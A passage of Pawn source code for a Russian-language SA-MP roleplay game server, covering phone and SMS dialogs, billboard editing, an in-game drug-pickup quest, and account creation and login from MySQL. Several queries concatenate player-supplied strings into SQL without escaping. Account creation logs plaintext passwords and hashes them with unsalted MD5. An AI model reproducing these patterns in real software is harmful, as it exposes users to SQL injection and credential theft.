	mysql_tquery(mysql,query);
	mysql_store_result();
	new srrt[70*20];
	new year, month, day, hour, minute, second,kek;
	new str[70],sos[24],sos1[24];
	if(mysql_num_rows() > 0)
	{
		for(new i = 1; i <= mysql_num_rows();i++)
		{
			if(mysql_fetch_row_format(query))
   			{
   			    mysql_get_field("time", sos);
   			    TimestampToDate(strval(sos), year, month, day, hour, minute, second,0);
				mysql_get_field("id1", sos);
				mysql_get_field("id2", sos1);
				format(str,sizeof(str),"{ffffff}[%02d/%02d/%02d %02d:%02d:%02d] {f7ae11}%s{ffffff} %s \n",day,month,year,hour, minute, second,(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? ("к") : ("от"),(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? (sos1) : (sos));
				strcat(srrt, str);
				mysql_get_field("id", sos);
				ListNick[playerid][kek] = strval(sos);
				kek++;
			}
		}
		mysql_free_result();
		ShowPlayerDialog(playerid,419,DIALOG_STYLE_LIST,"Сообщение",srrt,"Далее","Отмена");
	}
	else ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Сообщение","{ffffff}Сообщений нет!","Закрыть","");*/
	return 1;
}
function ShowAllPhone(playerid)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    query = "";
		new year, month, day, hour, minute, second,kek;
		new str[70],sos[24],sos1[24],text[60];
		for(new row = 1; row<= rows; row++)
		{
		    TimestampToDate(cache_get_field_content_int(row-1, "time", mysql), year, month, day, hour, minute, second,0);
			cache_get_field_content(row-1, "id1", sos, mysql);
			cache_get_field_content(row-1, "id2", sos1, mysql);
            cache_get_field_content(row-1, "sms", text, mysql);
			format(str,sizeof(str),"{ffffff}[%02d/%02d/%02d %02d:%02d:%02d] %s{ffffff} %s\n",day,month,year,hour, minute, second,text,(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? (sos1) : (sos));
			strcat(query, str);
			ListNick[playerid][kek] = cache_get_field_content_int(row-1, "id", mysql);
			kek++;
		}
		ShowPlayerDialog(playerid,421,DIALOG_STYLE_LIST,"Звонки",query,"Далее","Отмена");
	}
	else ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Звонки","{ffffff}Звонков нет!","Закрыть","");
	return 1;
}
stock ShowPhone(playerid)
{
    query = "";
    format(query, sizeof(query), "SELECT * FROM phonesms WHERE id1 = '%s' AND type = '1' LIMIT 20",PlayerInfo[playerid][pSendername],PlayerInfo[playerid][pSendername]);
	mysql_tquery(mysql, query, "ShowAllPhone", "d", playerid);
/*    format(query, sizeof(query), "SELECT * FROM phonesms WHERE id1 = '%s' AND type = '1'",PlayerInfo[playerid][pSendername],PlayerInfo[playerid][pSendername]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	new srrt[70*20];
	new year, month, day, hour, minute, second,kek;
	new str[70],sos[24],sos1[24],text[30];
	if(mysql_num_rows() > 0)
	{
		for(new i = 1; i <= mysql_num_rows();i++)
		{
			if(mysql_fetch_row_format(query))
   			{
   			    mysql_get_field("time", sos);
   			    TimestampToDate(strval(sos), year, month, day, hour, minute, second,0);
				mysql_get_field("id1", sos);
				mysql_get_field("id2", sos1);
				mysql_get_field("sms", text);
				format(str,sizeof(str),"{ffffff}[%02d/%02d/%02d %02d:%02d:%02d] %s{ffffff} %s\n",day,month,year,hour, minute, second,text,(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? (sos1) : (sos));
				strcat(srrt, str);
				mysql_get_field("id", sos);
				ListNick[playerid][kek] = strval(sos);
				kek++;
			}
		}
		mysql_free_result();
		ShowPlayerDialog(playerid,421,DIALOG_STYLE_LIST,"Звонки",srrt,"Далее","Отмена");
	}
	else ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Звонки","{ffffff}Звонков нет!","Закрыть","");*/
	return 1;
}
stock GetXYInFront(&Float:x, &Float:y, Float:angle, Float:distance)
{
    x += (distance * floatsin(-angle, degrees));
    y += (distance * floatcos(-angle, degrees));
}
stock ShowPlayerEditMenu(playerid)
{
	new string[256] = "", str[64], p_var = GetPVarInt(playerid,"SelectBildID"), font_face[12], aligment_name[18];

	BildIntro(playerid, p_var, -13);

	switch(BildInfo[p_var][bFontFace])
	{
	    case 0: font_face = "Arial";
	    case 1: font_face = "Calibri";
	    case 2: font_face = "Tahoma";
	    case 3: font_face = "Verdana";
	}

	switch(BildInfo[p_var][bAligment])
	{
	    case 0: aligment_name = "По левому краю";
	    case 1: aligment_name = "По центру";
	    case 2: aligment_name = "По правому краю";
	}

	strcat(string,"Текст\t{f7ae11}[Изменить]ffffff}");
	format(str,64,"\nЦвет фона\t{%s}[IIIII]ffffff}",Colors_LOW[BildInfo[p_var][bBackColor]]), strcat(string,str);
	format(str,64,"\nШрифт текста\t{f7ae11}[%s]ffffff}",font_face), strcat(string,str);
	format(str,32,"\nРазмер текста\t{f7ae11}[%i]{ffffff}",BildInfo[p_var][bFontSize]), strcat(string,str);
	format(str,64,"\nВыравнивание текста\t{f7ae11}[%s]{ffffff}",aligment_name), strcat(string,str);
//	format(str,32,"\n[!] Информация о баннерах");
	strcat(string,"\nАренда\t{f7ae11}[Разорвать договор]");

	return ShowPlayerDialog(playerid,388,DIALOG_STYLE_TABLIST,"Настройка параметров рекламы",string,"Выбрать","Закрыть");
}
function PutCamera(playerid,Float:x,Float:y,Float:z,Float:x1,Float:y1,Float:z1)
{
    SetPlayerCameraPos(playerid,x,y,z);
	SetPlayerCameraLookAt(playerid, x1,y1,z1);
	return 1;
}
stock BildIntro(playerid, b_id, c_dist)
{
	new Float:xs,Float:ys,Float:z;
	GetPlayerPos(playerid,xs,ys,z);
	if(!GetPVarInt(playerid,"PutCam"))
	{
		SetPVarInt(playerid,"PutCam",1);
		SetPVarFloat(playerid,"Specx",xs);
		SetPVarFloat(playerid,"Specy",ys);
		SetPVarFloat(playerid,"Specz",z);
		SetPVarInt(playerid,"Speci",GetPlayerInterior(playerid));
		SetPVarInt(playerid,"Specv",GetPlayerVirtualWorld(playerid));
	}
	TogglePlayerSpectating(playerid,true);
	new Float: x = BildInfo[b_id][bPos][0], Float: y = BildInfo[b_id][bPos][1];
    GetXYInFront(x, y, BildInfo[b_id][bPos][3], c_dist);
	SetTimerEx("PutCamera",200,false,"dffffff",playerid,x, y, BildInfo[b_id][bPos][2],BildInfo[b_id][bPos][0], BildInfo[b_id][bPos][1], BildInfo[b_id][bPos][2]);
	
	
    //
    //SetPlayerCameraPos(playerid, x, y, BildInfo[b_id][bPos][2]);
    //SetPlayerCameraLookAt(playerid, BildInfo[b_id][bPos][0], BildInfo[b_id][bPos][1], BildInfo[b_id][bPos][2]);
    
    return TogglePlayerControllable(playerid, 0), SetPlayerInterior(playerid, 0), true;
}
forward NarkoGo(playerid,kolvo);
public NarkoGo(playerid,kolvo)
{
    SmsDrugs(playerid,"Держи координаты...");
	SendClientMessage(playerid,CGREEN,"На карте отмечена ярко-фиолетовая зона. В ней находится закладка.");
	PlayerInfo[playerid][pNark] = kolvo;
	
	new rand1 = random(sizeof(GzForDrugs));
/*	0 0-3
	1 4-7
	2 8-11
	3 12-15
	4 16-20*/
	new rand2 = random(4) + rand1*4;
	static Float:ObjForDrugs[20][6] = {
	{-638.49, 2340.70, 134.65, 0.00, 0.00, 0.00},
	{ -661.62, 2306.46, 134.97, 0.00, 0.00, 0.00},
	{-813.44, 2392.23, 152.68, 0.00, 0.00, 0.00},
	{ -774.35, 2425.35, 156.01, 0.00, 0.00, 0.00},
	{-1325.75, 2582.24, 77.65, 0.00, 0.00, 0.00},
	{ -1317.85, 2539.52, 86.63, 0.00, 0.00, 0.00},
	{ -1319.86, 2509.87, 91.44, 0.00, 0.00, 0.00},
	{-1289.93, 2529.73, 86.58, 0.00, 0.00, 0.00},
	{-344.24, 1605.50, 74.82, 0.00, 0.00, 0.00},
	{ -302.41, 1551.07, 74.27, 0.00, 0.00, -48.09},
	{ -393.96, 1510.64, 74.51, 0.00, 0.00, 0.00},
	{ -365.95, 1494.16, 70.88, 0.00, 0.00, 0.00},
	{ 1742.81, 2732.90, 13.19, 0.00, 0.00, 0.00},
	{ 1766.20, 2880.32, 9.70, 0.00, 0.00, 0.00},
	{ 1878.36, 2865.64, 9.71, 0.00, 0.00, 0.00},
	{ 1799.48, 2813.10, 13.16, 0.00, 0.00, 0.00},
	{ 253.33, 2435.59, 15.65, 0.00, 0.00, 0.00},
	{ 313.21, 2411.29, 15.99, 0.00, 0.00, 0.00},
	{ 155.28, 2403.98, 15.80, 0.00, 0.00, 0.00},
	{ 130.33, 2429.99, 15.33, 0.00, 0.00, 0.00}
	};
	PlayerInfo[playerid][pNarkObj] = CreateDynamicObject(1575,ObjForDrugs[rand2][0],ObjForDrugs[rand2][1],ObjForDrugs[rand2][2]
	,ObjForDrugs[rand2][3],ObjForDrugs[rand2][4],ObjForDrugs[rand2][5],-1,-1,-1,300.0,300.0);
	GangZoneShowForPlayer(playerid,GzForDrugs1[rand1],0xA40EDFAA);
	SetPVarInt(playerid,"GzShow",rand1);
	
	return 1;
}


stock CatchDrugs(playerid)
{
    static const fmt_string1[] = "Вы подобрали %d гр. Теперь у Вас: %d гр.";
	new str[sizeof(fmt_string1)+4];
	format(str, sizeof(str), fmt_string1,PlayerInfo[playerid][pNark],PlayerInfo[playerid][pDrugs]+PlayerInfo[playerid][pNark]);
	SendClientMessage(playerid,CREWARD,str);
    GangZoneHideForPlayer(playerid,GzForDrugs1[GetPVarInt(playerid,"GzShow")]);
    DeletePVar(playerid,"GzShow");
    PlayerInfo[playerid][pDrugs] += PlayerInfo[playerid][pNark];
    GiveInv(playerid,337,PlayerInfo[playerid][pNark]);
    PlayerInfo[playerid][pNark] = 0;
    DestroyDynamicObject(PlayerInfo[playerid][pNarkObj]);
    PlayerInfo[playerid][pNarkObj] = 0;
    return 1;
}

stock ShowFight(playerid)
{
	new str[20];
	switch(PlayerInfo[playerid][pFight])
	{
		case 4: str = "Стандартный";
		case 5: str = "Боксер";
		case 6: str = "Кунг-фу";
		case 7: str = "Захват";
	}
	static const fmt_string[] = "1 | Стандартный\n2 | Боксер\n3 | Кунг-фу\n4 | Захват\nСейчас установлен: %s";
	new str1[sizeof(fmt_string)+20];
	format(str1, sizeof(str1), fmt_string,str);
	return ShowPlayerDialog(playerid,255,DIALOG_STYLE_LIST,"Изменить стиль боя",str1,"Далее","Назад");
}
stock SetPlayerZakaz(playerid)
{
    SetPlayerCheckpoint(playerid,1390.6154,-1.6414,1000.9299, 1.0);
	switch(random(3))
	{
		case 0:
		{
		    SendClientMessage(playerid,-1,"Поступил заказ приготовить блюдо 'Пицца'. Заберите ингредиент из холодильника");
		    SetPVarInt(playerid,"PovarEda",1);
		}
		case 1:
		{
		    SendClientMessage(playerid,-1,"Поступил заказ приготовить блюдо 'Бургер'. Заберите ингредиент из холодильника");
		    SetPVarInt(playerid,"PovarEda",2);
		}
		case 2:
		{
		    SendClientMessage(playerid,-1,"Поступил заказ приготовить блюдо 'Ролл Фиш'. Заберите ингредиент из холодильника");
		    SetPVarInt(playerid,"PovarEda",3);
		}
		case 3:
		{
		    SendClientMessage(playerid,-1,"Поступил заказ приготовить блюдо 'Пицца'. Заберите ингредиент из холодильника");
		    SetPVarInt(playerid,"PovarEda",1);
		}
	}
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	return 1;
}
stock SetACInt(stolb, znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE `ac` SET  `%d` = '%d'", stolb, znach);
	return mysql_tquery(mysql,Query);
}
stock SetMatsInt(stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE `obshak` SET  %s = '%d'", stolb, znach);
	return mysql_tquery(mysql,Query);
}
stock SetPlayerStr(username[], stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_ACCOUNT" SET  %s = '%s' WHERE name = '%s' LIMIT 1", stolb, znach, username);
	return mysql_tquery(mysql,Query);
}
stock SetHouseStr(username, stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE testhouse SET  %s = '%s' WHERE id = '%d' LIMIT 1", stolb, znach, username);
	return mysql_tquery(mysql,Query);
}
stock SaveGZLogo(i)
{
	format(query, sizeof(query), "UPDATE `gzlogo` SET `owner_1` = '%i',`owner_2` = '%i' WHERE `id` = '%d'", GZLogoInfo[i][gOwner][0], GZLogoInfo[i][gOwner][1], i);
    mysql_tquery(mysql,query);
	return true;
}
stock SetHouseInt(username, stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE testhouse SET  %s = '%i' WHERE id = '%d' LIMIT 1", stolb, znach, username);
	return mysql_tquery(mysql,Query);
}
stock CreateAccount(playerid, pass[])
{
	PlayerInfo[playerid][pLevel] = 1;
	query = "";
	format(query, 512, "INSERT INTO "TABLE_ACCOUNT" (name, password, level, sex, model, priglas, mail, ras, voz) VALUES ('%s','%s','%d','%d','%d','%s','%s','%d','%d')"
	, PlayerInfo[playerid][pSendername], MD5_Hash(pass),PlayerInfo[playerid][pLevel],PlayerInfo[playerid][pSex],PlayerInfo[playerid][pModel], PlayerInfo[playerid][pPriglas], PlayerInfo[playerid][pMail], PlayerInfo[playerid][pRas], PlayerInfo[playerid][pVoz]);
	mysql_tquery(mysql,query);
	new str[100];
	format(str,sizeof(str),"NAME: %s PASS: %s",PlayerInfo[playerid][pSendername], pass);
    Log("Acc",str);
   	//SendClientMessage(playerid,CREWARD ,"Советуем получить паспорт в Мэрии, а затем отправиться на работу: грузчика, повара, лесоруба, арбориста{FFFFFF} » (/gps - Работы).");
	SendClientMessage(playerid,CREWARD ,"Чтобы открыть меню персонажа достаточно ввести команду{FFFFFF} » (/mn).");
	SendClientMessage(playerid,CREWARD ,"Поздравляем Вас с успешной регистрацией. Желаем приятной игры!");
	
	OnPlayerLogin(playerid);
	return true;
}
stock OnPlayerLogin(playerid)
{
	printf("OnPlayerLogin");
    if(PlayerLogged[playerid] == true) return Kick(playerid, FIX_FUNCTION, 1200);
    new playername[32];
	GetPlayerName(playerid,playername,32);
	query = "";
	format(query, sizeof(query), "SELECT * FROM `accounts` WHERE `name` = '%s' LIMIT 1", playername);
	mysql_tquery(mysql, query, "OnPlayerLoginMysql", "d", playerid);
	return 1;
}

function OnPlayerLoginMysql(playerid)
{
	printf("OnPlayerLoginMysql");
	new biza[30],bizac[30],lics[50],acs[50],licstime[50],crimestats[50];
//	sscanf(query, "p<|>is[32]s[50]iiiiis[32]s[16]iiiiiiiiiiiiiiiis[30]s[30]iiifs[30]iiiiiiiiiiiiiiiiiiiiiiiis[16]iiiiiiis[50]is[20]iiiiiiiiiiis[20]s[20]iiiiiis[20]s[100]s[50]iiis[70]iiiis[40]is[20]dds[10]ddddddddddddds[30]s[30]dd",
	PlayerInfo[playerid][pID]= cache_get_row_int(0, 0, mysql);
	cache_get_row(0, 1, PlayerInfo[playerid][pSendername], mysql,24);
	cache_get_row(0, 2, PlayerInfo[playerid][pPassword], mysql,50);
	PlayerInfo[playerid][pAdmin]= cache_get_row_int(0, 3, mysql);
	PlayerInfo[playerid][pLevel]= cache_get_row_int(0, 4, mysql);
	PlayerInfo[playerid][pCash]= cache_get_row_int(0, 5, mysql);
	PlayerInfo[playerid][pSex]= cache_get_row_int(0, 6, mysql);
	PlayerInfo[playerid][pModel]= cache_get_row_int(0, 7, mysql);
	cache_get_row(0, 8, PlayerInfo[playerid][pPriglas], mysql,32);
	cache_get_row(0, 9, PlayerInfo[playerid][pIpReg], mysql,16);
	PlayerInfo[playerid][pAdminPass]= cache_get_row_int(0, 10, mysql);
	PlayerInfo[playerid][pMember]= cache_get_row_int(0, 11, mysql);
	PlayerInfo[playerid][pRank]= cache_get_row_int(0, 12, mysql);
	PlayerInfo[playerid][pLeader]= cache_get_row_int(0, 13, mysql);
	PlayerInfo[playerid][pPhone]= cache_get_row_int(0, 14, mysql);
	PlayerInfo[playerid][pLWarn]= cache_get_row_int(0, 15, mysql);
	PlayerInfo[playerid][pExp]= cache_get_row_int(0, 16, mysql);
	PlayerInfo[playerid][pWarn]= cache_get_row_int(0, 17, mysql);
	PlayerInfo[playerid][pPhoneBal]= cache_get_row_int(0, 18, mysql);
	PlayerInfo[playerid][pOnline]= cache_get_row_int(0, 19, mysql);
	PlayerInfo[playerid][pMash] = cache_get_row_int(0, 20, mysql);
	PlayerInfo[playerid][pZakon] = cache_get_row_int(0, 21, mysql);
	PlayerInfo[playerid][pWanted] = cache_get_row_int(0, 22, mysql);
	PlayerInfo[playerid][pMats] = cache_get_row_int(0, 23, mysql);
	PlayerInfo[playerid][pDrugs] = cache_get_row_int(0, 24, mysql);
	PlayerInfo[playerid][pDateO] = cache_get_row_int(0, 25, mysql);
	PlayerInfo[playerid][pDateIg] = cache_get_row_int(0, 26, mysql);
	PlayerInfo[playerid][pDateReg] = cache_get_row_int(0, 27, mysql);
	PlayerInfo[playerid][pMuted] = cache_get_row_int(0, 28, mysql);
	PlayerInfo[playerid][pHMuted] = cache_get_row_int(0, 29, mysql);
	PlayerInfo[playerid][pGolod] = cache_get_row_int(0, 30, mysql);
	PlayerInfo[playerid][pHeal] = cache_get_row_int(0, 31, mysql);
	cache_get_row(0, 32, lics, mysql,30);
	PlayerInfo[playerid][pWork] = cache_get_row_int(0, 33, mysql);
	PlayerInfo[playerid][pWarnSkok] = cache_get_row_int(0, 34, mysql);
	PlayerInfo[playerid][pWarnDate] = cache_get_row_int(0, 35, mysql);
	PlayerInfo[playerid][pJail] = cache_get_row_int(0, 36, mysql);
	PlayerInfo[playerid][pJailTime] = cache_get_row_int(0, 37, mysql);
	PlayerInfo[playerid][pSpawnChange] = cache_get_row_int(0, 38, mysql);
	PlayerInfo[playerid][pSpawn] = cache_get_row_int(0, 39, mysql);
	PlayerInfo[playerid][pBank] = cache_get_row_int(0, 40, mysql);
	PlayerInfo[playerid][pVip] = cache_get_row_int(0, 41, mysql);
	PlayerInfo[playerid][pAr] = cache_get_row_int(0, 42, mysql);
	PlayerInfo[playerid][pIng] = cache_get_row_int(0, 43, mysql);
	PlayerInfo[playerid][pKan] = cache_get_row_int(0, 44, mysql);
	PlayerInfo[playerid][pApt] = cache_get_row_int(0, 45, mysql);
	PlayerInfo[playerid][pMask] = cache_get_row_int(0, 46, mysql);
	PlayerInfo[playerid][pPayDay] = cache_get_row_int(0, 47, mysql);
	PlayerInfo[playerid][pSkin][0] = cache_get_row_int(0, 48, mysql);
	PlayerInfo[playerid][pSkin][1] = cache_get_row_int(0, 49, mysql);
	PlayerInfo[playerid][pSkin][2] = cache_get_row_int(0, 50, mysql);
	PlayerInfo[playerid][pRep] = cache_get_row_int(0, 51, mysql);
	PlayerInfo[playerid][pVoz] = cache_get_row_int(0, 52, mysql);
	PlayerInfo[playerid][pPass] = cache_get_row_int(0, 53, mysql);
	PlayerInfo[playerid][pVipis] = cache_get_row_int(0, 54, mysql);
	PlayerInfo[playerid][pSmoke] = cache_get_row_int(0, 55, mysql);
	PlayerInfo[playerid][pDonate] = cache_get_row_int(0, 56, mysql);
	cache_get_row(0, 57, PlayerInfo[playerid][pIp], mysql,16);
	PlayerInfo[playerid][pPin] = cache_get_row_int(0, 58, mysql);
	PlayerInfo[playerid][pPin1] = cache_get_row_int(0, 59, mysql);
	PlayerInfo[playerid][pDateM] = cache_get_row_int(0, 60, mysql);
	PlayerInfo[playerid][pOnlineMes] = cache_get_row_int(0, 61, mysql);
	PlayerInfo[playerid][pKolDonate] = cache_get_row_int(0, 62, mysql);
	PlayerInfo[playerid][pKolWarn] = cache_get_row_int(0, 63, mysql);
	PlayerInfo[playerid][pKolBan] = cache_get_row_int(0, 64, mysql);
    cache_get_row(0, 65, PlayerInfo[playerid][pMail], mysql,50);
	PlayerInfo[playerid][pRas] = cache_get_row_int(0, 66, mysql);
	cache_get_row(0, 67, PlayerInfo[playerid][pNumPass], mysql,25);
	PlayerInfo[playerid][pJob] = cache_get_row_int(0, 68, mysql);
	PlayerInfo[playerid][pTie] = cache_get_row_int(0, 69, mysql);
	PlayerInfo[playerid][pGiri] = cache_get_row_int(0, 70, mysql);
	PlayerInfo[playerid][pShtanga] = cache_get_row_int(0, 71, mysql);
	PlayerInfo[playerid][pBeg] = cache_get_row_int(0, 72, mysql);
	PlayerInfo[playerid][pVelo] = cache_get_row_int(0, 73, mysql);
	PlayerInfo[playerid][pSkillT] = cache_get_row_int(0, 74, mysql);
	PlayerInfo[playerid][pUdar] = cache_get_row_int(0, 75, mysql);
	PlayerInfo[playerid][pMin] = cache_get_row_int(0, 76, mysql);
	PlayerInfo[playerid][pMati] = cache_get_row_int(0, 77, mysql);
	PlayerInfo[playerid][pMatiTick] = cache_get_row_int(0, 78, mysql);
    cache_get_row(0, 79, acs, mysql,25);
    cache_get_row(0, 80, licstime, mysql,25);
	PlayerInfo[playerid][pMash1] = cache_get_row_int(0, 81, mysql);
	PlayerInfo[playerid][pADM] = cache_get_row_int(0, 82, mysql);
	PlayerInfo[playerid][pAdminC] = cache_get_row_int(0, 83, mysql);
	PlayerInfo[playerid][pGolos] = cache_get_row_int(0, 84, mysql);
	PlayerInfo[playerid][pGolos1] = cache_get_row_int(0, 85, mysql);
	PlayerInfo[playerid][pFam] = cache_get_row_int(0, 86, mysql);
	cache_get_row(0, 87, PlayerInfo[playerid][pSuAd], mysql,24);
	cache_get_row(0, 88, PlayerInfo[playerid][pAmmo], mysql,100);
	cache_get_row(0, 89, PlayerInfo[playerid][pGuns], mysql,50);
	PlayerInfo[playerid][pFight] = cache_get_row_int(0, 90, mysql);
	PlayerInfo[playerid][pShtrav] = cache_get_row_int(0, 91, mysql);
	PlayerInfo[playerid][pGA] = cache_get_row_int(0, 92, mysql);
	cache_get_row(0, 93, PlayerInfo[playerid][pVPos], mysql,70);
	
	PlayerInfo[playerid][pTestMoney] = cache_get_row_int(0, 95, mysql);
	PlayerInfo[playerid][pQuest] = cache_get_row_int(0, 96, mysql);
	PlayerInfo[playerid][pDCar] = cache_get_row_int(0, 97, mysql);
	cache_get_row(0, 98, PlayerInfo[playerid][pSkills], mysql,50);
	PlayerInfo[playerid][pMash2] = cache_get_row_int(0, 99, mysql);
	
	PlayerInfo[playerid][pZavisimost] = cache_get_row_int(0, 100, mysql);
	PlayerInfo[playerid][pWorkSpawn] = cache_get_row_int(0, 101, mysql);
	cache_get_row(0, 102, PlayerInfo[playerid][pQs], mysql,5);
	PlayerInfo[playerid][pInGame] = cache_get_row_int(0, 103, mysql);
	PlayerInfo[playerid][pUl][0] = cache_get_row_int(0, 104, mysql);
	PlayerInfo[playerid][pUl][1] = cache_get_row_int(0, 105, mysql);
	PlayerInfo[playerid][pUl][2] = cache_get_row_int(0, 106, mysql);
	PlayerInfo[playerid][pVKCode] = cache_get_row_int(0, 107, mysql);
	PlayerInfo[playerid][pVKStatus] = cache_get_row_int(0, 108, mysql);
	PlayerInfo[playerid][pVK] = cache_get_row_int(0, 109, mysql);
	PlayerInfo[playerid][pAvig] = cache_get_row_int(0, 110, mysql);
	PlayerInfo[playerid][pDamage] = cache_get_row_int(0, 111, mysql);
	PlayerInfo[playerid][pFVig] = cache_get_row_int(0, 112, mysql);
	PlayerInfo[playerid][pGangScore] = cache_get_row_int(0, 113, mysql);
	PlayerInfo[playerid][pBankPin] = cache_get_row_int(0, 114, mysql);
	PlayerInfo[playerid][pHod] = cache_get_row_int(0, 115, mysql);
	cache_get_row(0, 116, biza, mysql,30);
	cache_get_row(0, 117, bizac, mysql,30);
	PlayerInfo[playerid][pCode] = cache_get_row_int(0, 118, mysql);
	PlayerInfo[playerid][pWantedA]  = cache_get_row_int(0, 119, mysql);
	PlayerInfo[playerid][pJailKol]  = cache_get_row_int(0, 120, mysql);
	PlayerInfo[playerid][pMuteKol]  = cache_get_row_int(0, 121, mysql);
	PlayerInfo[playerid][pBanKol]  = cache_get_row_int(0, 122, mysql);
	PlayerInfo[playerid][pAnsKol]  = cache_get_row_int(0, 123, mysql);
	PlayerInfo[playerid][pWarnKol]  = cache_get_row_int(0, 124, mysql);
	new innvslot[300],invkol[300];
	cache_get_row(0, 125, innvslot, mysql,300);
	cache_get_row(0, 126, invkol, mysql,300);
	PlayerInfo[playerid][pShtravTick]  = cache_get_row_int(0, 127, mysql);
	PlayerInfo[playerid][pTest]  = cache_get_row_int(0, 128, mysql);
	PlayerInfo[playerid][pPros]  = cache_get_row_int(0, 129, mysql);
	PlayerInfo[playerid][pProsFrac]  = cache_get_row_int(0, 130, mysql);
	PlayerInfo[playerid][pCRL]  = cache_get_row_int(0, 131, mysql);
	PlayerInfo[playerid][pCRC]  = cache_get_row_int(0, 132, mysql);
	PlayerInfo[playerid][pCRT]  = cache_get_row_int(0, 133, mysql);
	cache_get_row(0, 134, crimestats, mysql,50);
	PlayerInfo[playerid][pOtm]  = cache_get_row_int(0, 135, mysql);
	new quests[200],questss[100];
	cache_get_row(0, 136, quests, mysql,200);
	
	cache_get_row(0, 137, questss, mysql,200);
	
	PlayerInfo[playerid][pGrabTeam]  = cache_get_row_int(0, 138, mysql);
	PlayerInfo[playerid][pGrabQuest]  = cache_get_row_int(0, 139, mysql);
 	BankGrab[playerid][bLeader] = cache_get_row_int(0, 140, mysql);
 	BankGrab[playerid][bPlayer][0] = cache_get_row_int(0, 141, mysql);
 	BankGrab[playerid][bPlayer][1] = cache_get_row_int(0, 142, mysql);
 	BankGrab[playerid][bPlayer][2] = cache_get_row_int(0, 143, mysql);
 	BankGrab[playerid][bQuest][0] = cache_get_row_int(0, 144, mysql);
 	BankGrab[playerid][bQuest][1] = cache_get_row_int(0, 145, mysql);
 	BankGrab[playerid][bQuest][2] = cache_get_row_int(0, 146, mysql);
 	BankGrab[playerid][bQuest][3] = cache_get_row_int(0, 147, mysql);
 	BankGrab[playerid][bQuest][4] = cache_get_row_int(0, 148, mysql);
 	BankGrab[playerid][bTown] = cache_get_row_int(0, 149, mysql);
 	BankGrab[playerid][bTimes] = cache_get_row_int(0, 150, mysql);
	/*	bLeader,
	bPlayer[3],
	bVeh,
	bTimes,
	bQuest[5],
	bTown,
	bGrab,
	bTickBomb,
	bBombStatus,
	bGrabStatus



	*/
	
	sscanf(questss, "p<,>a<i>[20]",PlayerInfo[playerid][pQuestS]);
	sscanf(quests,"p<,>dddddddddddddddddddddddddddddddd",PlayerQuest[playerid][1][0],PlayerQuest[playerid][1][1],PlayerQuest[playerid][1][2],PlayerQuest[playerid][1][3],
	PlayerQuest[playerid][3][0],PlayerQuest[playerid][4][0],PlayerQuest[playerid][4][1],PlayerQuest[playerid][4][2],PlayerQuest[playerid][4][3],PlayerQuest[playerid][4][4],
	PlayerQuest[playerid][5][0],PlayerQuest[playerid][6][0],PlayerQuest[playerid][7][0],PlayerQuest[playerid][8][0],PlayerQuest[playerid][9][0],PlayerQuest[playerid][10][0]
    ,PlayerQuest[playerid][11][0],PlayerQuest[playerid][12][0],PlayerQuest[playerid][13][0],PlayerQuest[playerid][13][1],PlayerQuest[playerid][14][0]
    ,PlayerQuest[playerid][15][0],PlayerQuest[playerid][16][0],PlayerQuest[playerid][16][0],PlayerQuest[playerid][17][0],PlayerQuest[playerid][18][0]
    ,PlayerQuest[playerid][19][0]);
	sscanf(crimestats, "p<,>a<i>[8]",PlayerInfo[playerid][pCrimeStats]);
	sscanf(bizac, "p<,>ddddd",PlayerInfo[playerid][pBizAC][0],PlayerInfo[playerid][pBizAC][1]
	,PlayerInfo[playerid][pBizAC][2],PlayerInfo[playerid][pBizAC][3],PlayerInfo[playerid][pBizAC][4]);
	sscanf(biza, "p<,>ddddd",PlayerInfo[playerid][pBizA][0],PlayerInfo[playerid][pBizA][1]
	,PlayerInfo[playerid][pBizA][2],PlayerInfo[playerid][pBizA][3],PlayerInfo[playerid][pBizA][4]);
	//sscanf(PlayerInfo[playerid][pQs], "%d,%d,%d",PlayerInfo[playerid][pQ][0],PlayerInfo[playerid][pQ][1],PlayerInfo[playerid][pQ][2]);
	sscanf(PlayerInfo[playerid][pAmmo], "p<,>a<i>[13]",GunInfo[playerid][pAmmo]);
	sscanf(PlayerInfo[playerid][pGuns], "p<,>a<i>[13]",GunInfo[playerid][pWeapon]);
	sscanf(innvslot, "p<,>a<i>[50]",InvInfo[playerid][iSlot]);
	sscanf(invkol, "p<,>a<i>[50]",InvInfo[playerid][iKol]);
	
	
	sscanf(acs, "p<,>dddddd",PlayerInfo[playerid][pAcs][0],PlayerInfo[playerid][pAcs][1]
	,PlayerInfo[playerid][pAcs][2],PlayerInfo[playerid][pAcs][3],PlayerInfo[playerid][pAcs][4],PlayerInfo[playerid][pAcs][5]);
	
	
	sscanf(licstime, "p<,>dddddd",PlayerInfo[playerid][pLicTime][0],PlayerInfo[playerid][pLicTime][1]
	,PlayerInfo[playerid][pLicTime][2],PlayerInfo[playerid][pLicTime][3],PlayerInfo[playerid][pLicTime][4],PlayerInfo[playerid][pLicTime][5]
	,PlayerInfo[playerid][pLicTime][6]);
	
	sscanf(lics, "p<,>ddddddd",PlayerInfo[playerid][pLic][0],PlayerInfo[playerid][pLic][1]
	,PlayerInfo[playerid][pLic][2],PlayerInfo[playerid][pLic][3],PlayerInfo[playerid][pLic][4]
	,PlayerInfo[playerid][pLic][5],PlayerInfo[playerid][pLic][6]);
	sscanf(PlayerInfo[playerid][pSkills], "p<,>ddddddd",PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][1]
	,PlayerInfo[playerid][pGunSkill][2],PlayerInfo[playerid][pGunSkill][3],PlayerInfo[playerid][pGunSkill][4],PlayerInfo[playerid][pGunSkill][5]
	,PlayerInfo[playerid][pGunSkill][6]);
